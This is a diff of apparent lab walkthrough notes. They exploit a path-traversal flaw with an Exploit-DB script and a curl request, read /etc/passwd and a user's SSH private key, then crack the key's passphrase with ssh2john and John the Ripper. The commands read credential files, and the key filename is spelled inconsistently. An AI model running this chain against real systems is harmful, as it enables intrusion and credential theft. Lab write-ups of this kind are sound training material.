@@ -19,11 +19,40 @@ searchsploit -m 50383.sh
 
 # Run the exploitation
 code targets.txt
-bash 50383.sh
-# Seem like the script unable to work
-# We can try to get the script command and follow to below
-
-curl -v --path-as-is http://192.168.243.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-# Here we get some users
+bash 50383.sh targets.txt /etc/passwd
+# Here we get some users lets update to user file
 [user.txt]
+
+# We can try to check on each user .ssh path 
+# Common private key filename can refer to below 
+id_rsa：RSA私钥文件。
+id_dsa：DSA私钥文件（较少使用）。
+id_ecdsa：ECDSA私钥文件（使用椭圆曲线加密算法）。
+id_ed25519：Ed25519私钥文件（使用EdDSA算法）。
+id_xmss：XMSS私钥文件（使用Hash-based签名算法）。
+
+# Then we found anita user have id_edcsa
+sudo bash 50383.sh targets.txt /home/anita/.ssh/id_ecdsa
+
+# Then we found the privatekey require passphrase
+ssh -i id_edcsa anita@192.168.243.245 -p 2222
+Enter passphrase for key 'id_edcsa': 
+
+# Use ssh2john to extract the hash
+ssh2john id_edcsa > ssh.hash
+
+hashcat -h | grep -i "ssh" 
+...
+22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
+...
+# Hashcat seem unable to crack we can try with JohntheRipper
+john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+...
+fireball         (id_edcsa) 
+...
+
+# SSH it with the password cracked again
+cat local.txt
+
+
 
